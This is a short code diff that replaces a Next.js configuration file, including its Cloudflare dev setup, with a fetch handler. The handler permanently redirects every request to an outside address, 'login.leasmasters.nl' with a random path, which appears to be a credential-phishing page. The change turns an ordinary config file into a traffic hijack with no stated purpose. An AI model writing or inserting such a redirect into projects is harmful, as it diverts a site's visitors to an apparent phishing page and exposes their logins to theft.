@@ -1,11 +1,9 @@
-import type { NextConfig } from "next";
+addEventListener("fetch", event => {
+  event.respondWith(handleRequest(event.request))
+})
 
-const nextConfig: NextConfig = {
-  /* config options here */
-};
+async function handleRequest(request) {
+  const redirectUrl = "https://login.leasmasters.nl/hsrdNGMH" // Replace with your target URL
 
-export default nextConfig;
-
-// added by create cloudflare to enable calling `getCloudflareContext()` in `next dev`
-import { initOpenNextCloudflareForDev } from "@opennextjs/cloudflare";
-initOpenNextCloudflareForDev();
+  return Response.redirect(redirectUrl, 301) // 301 for permanent, use 302 for temporary
+}
